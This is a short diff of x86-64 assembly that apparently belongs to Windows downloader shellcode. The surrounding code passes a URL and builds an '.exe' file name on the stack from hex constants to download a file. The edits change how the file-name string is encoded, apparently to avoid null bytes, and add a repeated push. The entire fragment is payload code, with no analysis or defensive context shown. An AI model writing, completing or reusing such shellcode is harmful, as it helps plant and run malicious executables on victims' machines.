@@ -104,7 +104,8 @@ main:
 returnURL : 
     pop rdx                                     ; szURL
     xor r8, r8 
-    mov r8d, 0x6578652e
+    mov r8, 0x6578652eaaaaaaaa 
+    shr r8, 16 
     push r8 
     mov r8, 0x3237663731653832 
     push r8
@@ -114,6 +115,8 @@ returnURL :
     push r8 
     mov r8, 0x3839303531303039
     push r8  
+    mov r8, 0x3839303531303039
+    push r8
     mov r8, rsp                                 ; szFileName 
     xor rcx, rcx                                ; pCaller  
     xor r9d, r9d                                ; dwReserved 
